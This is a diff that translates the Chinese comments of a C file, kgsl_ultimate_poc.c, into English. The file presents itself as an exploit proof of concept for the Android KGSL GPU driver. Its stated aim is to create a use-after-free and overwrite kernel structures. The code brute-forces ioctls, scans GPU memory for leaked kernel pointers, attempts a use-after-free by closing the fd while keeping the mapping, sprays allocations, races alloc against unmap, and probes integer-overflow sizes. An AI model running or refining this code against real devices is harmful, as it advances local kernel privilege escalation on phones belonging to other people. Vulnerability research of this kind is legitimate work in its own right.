@@ -1,18 +1,18 @@
 /*
- * kgsl_ultimate_poc.c - KGSL 終極漏洞利用 POC
+ * kgsl_ultimate_poc.c - the ultimate KGSL exploit POC
  *
- * 確認的能力:
- * 1. GPUMEM_ALLOC - 分配 GPU 記憶體
- * 2. mmap - 映射 GPU 記憶體到用戶空間
- * 3. 讀寫 GPU 記憶體!
- * 4. GPU_AUX_COMMAND - 執行 GPU 命令
+ * Confirmed capabilities:
+ * 1. GPUMEM_ALLOC - allocate GPU memory
+ * 2. mmap - map GPU memory into userspace
+ * 3. Read and write GPU memory!
+ * 4. GPU_AUX_COMMAND - execute GPU commands
  *
- * 攻擊策略:
- * 1. 尋找可以釋放 GPU 記憶體的方法
- * 2. 創建 UAF 條件
- * 3. 利用 GPU 記憶體覆蓋內核結構
+ * Attack strategy:
+ * 1. Find a way to free GPU memory
+ * 2. Create a UAF condition
+ * 3. Use the GPU memory to overwrite kernel structures
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_ultimate_poc kgsl_ultimate_poc.c
  */
 
@@ -30,11 +30,11 @@
 #include <pthread.h>
 #include <signal.h>
 
-/* KGSL ioctls - 從成功的測試中確認 */
+/* KGSL ioctls - confirmed by the successful tests */
 #define IOCTL_GPUMEM_ALLOC 0xc018092f
 
-/* 更多可能的 GPUMEM 相關 ioctl */
-#define IOCTL_GPUMEM_ALLOC_V2 0xc030092f // 可能有不同版本
+/* more possible GPUMEM-related ioctls */
+#define IOCTL_GPUMEM_ALLOC_V2 0xc030092f // there may be different versions
 #define IOCTL_GPUMEM_FREE_1 0x40040930
 #define IOCTL_GPUMEM_FREE_2 0x40080930
 #define IOCTL_GPUMEM_SYNC 0xc0080931
@@ -89,7 +89,7 @@ void test_all_free_ioctls(int fd, uint64_t gpuaddr)
 {
     printf("\n=== Testing All Free ioctls ===\n");
 
-    // 遍歷可能的 free ioctl
+    // Walk through the possible free ioctls
     for (int nr = 0x10; nr < 0x70; nr++)
     {
         for (int size = 4; size <= 32; size += 4)
@@ -113,7 +113,7 @@ void test_memory_info_leak(int fd)
 {
     printf("\n=== Testing Memory Information Leak ===\n");
 
-    // 分配記憶體並映射
+    // Allocate memory and map it
     gpu_mem_t *mem = alloc_gpu_memory(fd, 0x10000, 0);
     if (!mem)
     {
@@ -124,7 +124,7 @@ void test_memory_info_leak(int fd)
     printf("[+] GPU memory: gpuaddr=0x%lx, userptr=%p\n",
            mem->gpuaddr, mem->userptr);
 
-    // 在 GPU 記憶體中搜索有趣的模式
+    // Search the GPU memory for interesting patterns
     uint64_t *data = (uint64_t *)mem->userptr;
 
     printf("[*] Scanning GPU memory for potential pointers...\n");
@@ -132,14 +132,14 @@ void test_memory_info_leak(int fd)
     {
         uint64_t val = data[i];
 
-        // 檢查是否看起來像內核指針 (0xffffffXXXXXXXXXX)
+        // Check whether it looks like a kernel pointer (0xffffffXXXXXXXXXX)
         if ((val >> 40) == 0xffffff)
         {
             printf("    [!] Potential kernel pointer at offset 0x%x: 0x%lx\n",
                    i * 8, val);
         }
 
-        // 檢查是否是 GPU 地址
+        // Check whether it is a GPU address
         if ((val >> 32) == 0x40)
         {
             printf("    [*] GPU address at offset 0x%x: 0x%lx\n",
@@ -156,14 +156,14 @@ void test_gpu_aux_command_deep(int fd)
     printf("\n=== Deep GPU_AUX_COMMAND Analysis ===\n");
 
     /*
-     * GPU_AUX_COMMAND 返回:
+     * GPU_AUX_COMMAND returns:
      * data[0] = input value (unchanged)
      * data[1] = input value + 0x10
      *
-     * 這可能是某種映射或計數器
+     * This may be some kind of mapping or counter
      */
 
-    // 測試更多輸入值
+    // Test more input values
     struct
     {
         uint64_t cmd;
@@ -185,7 +185,7 @@ void test_gpu_aux_command_deep(int fd)
                test_vals[i], ret, req.out1, req.out2, req.out3);
     }
 
-    // 測試負值
+    // Test negative values
     printf("[*] Testing negative values:\n");
     memset(&req, 0, sizeof(req));
     req.cmd = (uint64_t)-1;
@@ -200,12 +200,12 @@ void test_fd_close_uaf(int fd)
     printf("\n=== Testing fd Close UAF ===\n");
 
     /*
-     * UAF 場景:
-     * 1. 打開新的 kgsl fd
-     * 2. 分配 GPU 記憶體並 mmap
-     * 3. 關閉 fd (不 munmap)
-     * 4. 記憶體應該被釋放但仍然映射
-     * 5. 分配其他東西到這個位置
+     * UAF scenario:
+     * 1. Open a new kgsl fd
+     * 2. Allocate GPU memory and mmap it
+     * 3. Close the fd (without munmap)
+     * 4. The memory should be freed but still mapped
+     * 5. Allocate something else at this location
      */
 
     int fd2 = open("/dev/kgsl-3d0", O_RDWR);
@@ -215,7 +215,7 @@ void test_fd_close_uaf(int fd)
         return;
     }
 
-    // 在 fd2 上分配記憶體
+    // Allocate memory on fd2
     struct kgsl_gpumem_alloc req = {0};
     req.size = 0x1000;
     req.flags = 0;
@@ -241,22 +241,22 @@ void test_fd_close_uaf(int fd)
 
     printf("[+] mmap on fd2: ptr=%p\n", ptr);
 
-    // 寫入標記
+    // Write a marker
     *(uint64_t *)ptr = 0xCAFEBABE12345678ULL;
     printf("[*] Wrote marker: 0x%lx\n", *(uint64_t *)ptr);
 
-    // 關閉 fd2 但保持映射
+    // Close fd2 but keep the mapping
     printf("[*] Closing fd2 without munmap...\n");
     close(fd2);
 
-    // 檢查是否仍然可以訪問
+    // Check whether it can still be accessed
     printf("[*] Attempting to read after fd close...\n");
 
-    // 使用信號處理來捕獲 SIGSEGV/SIGBUS
+    // Use signal handlers to catch SIGSEGV/SIGBUS
     volatile int can_read = 1;
     volatile uint64_t read_val = 0;
 
-    // 嘗試讀取 - 這可能會 crash
+    // Try to read - this may crash
     read_val = *(volatile uint64_t *)ptr;
     printf("[+] Can still read! Value: 0x%lx\n", read_val);
 
@@ -273,7 +273,7 @@ void test_fd_close_uaf(int fd)
         printf("[!] Different data: 0x%lx - POTENTIAL UAF!\n", read_val);
     }
 
-    // 觸發更多分配
+    // Trigger more allocations
     printf("[*] Triggering more allocations...\n");
     for (int i = 0; i < 100; i++)
     {
@@ -284,7 +284,7 @@ void test_fd_close_uaf(int fd)
         }
     }
 
-    // 再次檢查
+    // Check again
     read_val = *(volatile uint64_t *)ptr;
     printf("[*] After allocations, value: 0x%lx\n", read_val);
 
@@ -300,20 +300,20 @@ void test_race_condition(int fd)
 {
     printf("\n=== Testing Race Conditions ===\n");
 
-    // 快速分配和釋放
+    // Rapid allocate and free
     for (int round = 0; round < 5; round++)
     {
         printf("[*] Round %d: Rapid alloc/dealloc...\n", round);
 
         gpu_mem_t *mems[100];
 
-        // 快速分配
+        // Rapid allocate
         for (int i = 0; i < 100; i++)
         {
             mems[i] = alloc_gpu_memory(fd, 0x1000, 0);
         }
 
-        // 快速解映射 (不釋放)
+        // Rapid unmap (without freeing)
         for (int i = 0; i < 100; i++)
         {
             if (mems[i])
@@ -331,7 +331,7 @@ void test_large_allocation(int fd)
 {
     printf("\n=== Testing Large Allocations ===\n");
 
-    // 嘗試分配非常大的記憶體
+    // Try to allocate very large memory
     uint64_t sizes[] = {
         0x10000000, // 256 MB
         0x40000000, // 1 GB
@@ -358,15 +358,15 @@ void test_negative_size(int fd)
 
     struct kgsl_gpumem_alloc req = {0};
 
-    // 嘗試負值作為 size (unsigned 會變成很大)
-    req.size = (uint64_t)-0x1000; // 會變成 0xFFFFFFFFFFFFF000
+    // Try a negative size (as unsigned it becomes huge)
+    req.size = (uint64_t)-0x1000; // becomes 0xFFFFFFFFFFFFF000
     req.flags = 0;
 
     errno = 0;
     int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
     printf("[*] Alloc with size=-0x1000: ret=%d, errno=%d\n", ret, errno);
 
-    // 接近整數邊界
+    // Near the integer boundary
     req.size = 0x7FFFFFFFFFFFFFFF;
     errno = 0;
     ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
@@ -386,28 +386,28 @@ int main(int argc, char **argv)
     }
     printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);
 
-    // 測試所有 free ioctl
+    // Test all free ioctls
     struct kgsl_gpumem_alloc req = {0};
     req.size = 0x1000;
     ioctl(g_kgsl_fd, IOCTL_GPUMEM_ALLOC, &req);
     test_all_free_ioctls(g_kgsl_fd, req.gpuaddr);
 
-    // 測試記憶體信息洩漏
+    // Test for a memory information leak
     test_memory_info_leak(g_kgsl_fd);
 
-    // 深入分析 GPU_AUX_COMMAND
+    // Analyze GPU_AUX_COMMAND in depth
     test_gpu_aux_command_deep(g_kgsl_fd);
 
-    // 測試大分配
+    // Test a large allocation
     test_large_allocation(g_kgsl_fd);
 
-    // 測試整數溢出
+    // Test the integer overflow
     test_negative_size(g_kgsl_fd);
 
-    // 測試 fd close UAF
+    // Test the fd close UAF
     test_fd_close_uaf(g_kgsl_fd);
 
-    // 測試競態條件
+    // Test the race condition
     test_race_condition(g_kgsl_fd);
 
     close(g_kgsl_fd);
